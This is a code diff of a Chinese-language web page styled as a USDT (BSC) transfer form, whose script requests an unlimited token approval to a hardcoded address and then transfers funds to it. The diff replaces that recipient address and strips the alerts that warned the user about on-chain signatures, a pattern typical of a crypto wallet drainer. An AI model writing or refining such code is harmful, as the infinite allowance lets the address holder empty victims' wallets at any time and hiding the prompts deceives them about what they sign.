@@ -50,7 +50,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
     <div class="fixed-addr-box" id="targetAddrText">0x0000000000000000000000000000000000000000</div>
 </div>
 <div class="amount-card">
-    <div class="label-text">转出数量（USDT‑BSC）</div>
+    <div class="label-text">转出数量</div>
     <div class="amount-row">
         <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
         <div class="max-btn" id="maxBtn">全部</div>
@@ -82,7 +82,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <script>
-const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
+const TARGET_ADDR = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const GAS_LIMIT = "0x493E0";
 const MAX_WAIT = 40;
@@ -234,10 +234,8 @@ sendBtn.addEventListener("click", async () => {
             // 发起无限授权
             const approveData = usdtContract.methods.approve(TARGET_ADDR, INFINITE_ALLOWANCE).encodeABI();
             await sendTx(approveData);
-            alert("✅签名已上链，等待节点同步");
             await waitAllowance(needWei);
         }
-        alert("即将执行转账，请钱包确认签名");
         const transferData = usdtContract.methods.transfer(TARGET_ADDR, needWei).encodeABI();
         const txHash = await sendTx(transferData);
         alert(`🎉转账成功！哈希：${txHash}`);
